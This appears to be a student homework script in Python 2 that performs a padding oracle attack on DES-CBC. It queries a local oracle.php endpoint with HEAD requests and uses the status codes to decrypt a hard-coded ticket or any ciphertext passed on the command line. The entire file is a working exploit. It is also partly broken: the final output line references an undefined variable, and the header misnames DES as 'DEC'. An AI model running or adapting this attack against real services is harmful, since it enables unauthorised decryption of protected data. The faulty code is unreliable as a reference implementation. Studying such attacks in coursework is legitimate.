#!/usr/bin/env python

# Use padding oracle to decrypt DEC encrypted message
#
# Create by: Shi Su, AndrewId:shis
# 10/06/2015

import httplib
import argparse
import binascii
import time

ORACLE_HOST = "127.0.0.1"
QUERY_PATH = "/oracle.php?ticket="
# ORACLE_HOST = "stackoverflow.com"
# QUERY_PATH = "/search?q="
# cipher text in HW1
ENCRYPT_TICKET = "0c80353a2c634be44096f9d7977bad4d60dcd000224743105c8eacc3f872e37a2e6c8afdaecba65e8d94754e15a587ea1620cf6b6bc59a0fe5d74400a7cabebbe9fa63236a1a6c90"
BLOCK_SIZE = 8

""" 
    Ask oracle if the decrypted ticket has valid padding
    by making HEAD request as we only need the status code
    Return True if status code is 200, otherwise return False
"""
def hasValidPadding(query):
    conn = httplib.HTTPConnection(ORACLE_HOST)
    conn.request("HEAD", QUERY_PATH + query)

    status = conn.getresponse().status;


    if status == 200:
        #print "----" + str(status)
        #print "----" + query
        return True
    else:
        return False

"""
    Divide the long ciphertext into 16 hex string blocks
"""
def chunck(string):
    return [ bytearray.fromhex(string[i:i + BLOCK_SIZE * 2]) for i in range(0, len(string), BLOCK_SIZE * 2) ]


"""
    When creating valid padding for the first time in a block
    Get the actual numbers of padding byte
"""
def get_padding_num(test_block, target_block):
    #print "- getting padding number -"
    #print binascii.hexlify(test_block)
    
    temp = bytearray(test_block)
    for i in range(0, BLOCK_SIZE):
        temp[i] = 0x00
        query = binascii.hexlify(temp) + binascii.hexlify(target_block)
        if not hasValidPadding(query):
            break

    return BLOCK_SIZE - i

"""
    Get actual padding when knowning the number of padding
"""
def get_padding(padding_num):
    padding = 0
    for i in range(0, padding_num):
        padding = (padding << 8) + padding_num

    return padding


def padding_attack():

    # if no other cipher text provided, decrypt the one provided in HW1
    if args.ciphertext is None:
        ciphertext = ENCRYPT_TICKET
    else:
        ciphertext = args.ciphertext

    # 2 hex character represent 1 byte, remove IV block
    length = (len(ciphertext) >> 1) - BLOCK_SIZE
    # number of block = length/8
    block_num = length >> 3
    # create a bytearray with all 0 to store decrypted text
    plaintext = bytearray(length)
    # chunck the cipher text into int blocks
    blocks = chunck(ciphertext)

    for decrypted_blocks in range(0, block_num):

        i = decrypted_blocks
        decrypted_byte = 0
        padding_num = 0
        padding = 0
        test_block = bytearray(blocks[i])
        target_block = bytearray(blocks[i + 1])
        dec_target = bytearray(BLOCK_SIZE)

        print "---------------------------------------------"
        print "decrypted_blocks: " + str(decrypted_blocks)
        print "test block: "+ binascii.hexlify(test_block)
        print "target block: "+ binascii.hexlify(target_block)

        while decrypted_byte < BLOCK_SIZE:
            print "--------------------"
            print " decrypted_bytes: " + str(decrypted_byte)
            print " testing: "+ binascii.hexlify(test_block)
            # the byte is changing to produce a valid padding
            test_byte = BLOCK_SIZE - decrypted_byte - 1
        
            # change 1 byte in testblock, try to generate Px with valid padding
            for x in range(0,256):

                test_block[test_byte] = x
                # send the 2 byte to oracle
                query = binascii.hexlify(test_block) + binascii.hexlify(target_block)

                if hasValidPadding(query):
                    break

            if decrypted_byte == 0:
                print "decrypted first few bytes"
                padding_num = get_padding_num(test_block, target_block)
                padding = get_padding(padding_num)

                # only the last few bytes are useful
                # Dec(Ctarget) = Ptest(with padding) ^ Ctest
                print "blocks[decrypted_blocks][7]" + hex(blocks[decrypted_blocks][7])


                for y in range( BLOCK_SIZE - padding_num, BLOCK_SIZE):
                    dec_target[y] = test_block[y] ^ padding_num
                    position = BLOCK_SIZE * decrypted_blocks + y
                    plaintext[position] = dec_target[y] ^ blocks[decrypted_blocks][y]

                decrypted_byte = padding_num
            else:
                padding_num = decrypted_byte + 1
                padding = get_padding(padding_num)

                # only the last few bytes are useful
                # Dec(Ctarget) = Ptest(with padding) ^ Ctest
                dec_target[test_byte] = test_block[test_byte] ^ padding_num
                # Ptarget = Dec(Ctarget) ^ Ctarget-1

                posistion = BLOCK_SIZE * decrypted_blocks + (BLOCK_SIZE - padding_num)
                plaintext[posistion] = dec_target[test_byte] ^ blocks[decrypted_blocks][test_byte]
                
                decrypted_byte += 1

            print "dec_target: " + binascii.hexlify(dec_target)
            print "hex represent:" + binascii.hexlify(plaintext)

            #test_block = dec_target ^ get_padding(decrypted_byte + 1)
            for i in range (0, BLOCK_SIZE):
                test_block[i] = dec_target[i] ^ (padding_num + 1)
    
    print "---------------------------------------------"
    print "ciphertext: " + reconstruct
    print "hex represent: " + binascii.hexlify(plaintext)
    print "ascii: " + binascii.hexlify(plaintext).decode("hex")

    return



if __name__ == "__main__":
   parser = argparse.ArgumentParser(description='Use padding attack to decrypt a DES encrypted ticket')
   parser.add_argument('-c','--ciphertext', help='DES ciphertext to be decrypted')
   args = parser.parse_args()
   padding_attack()
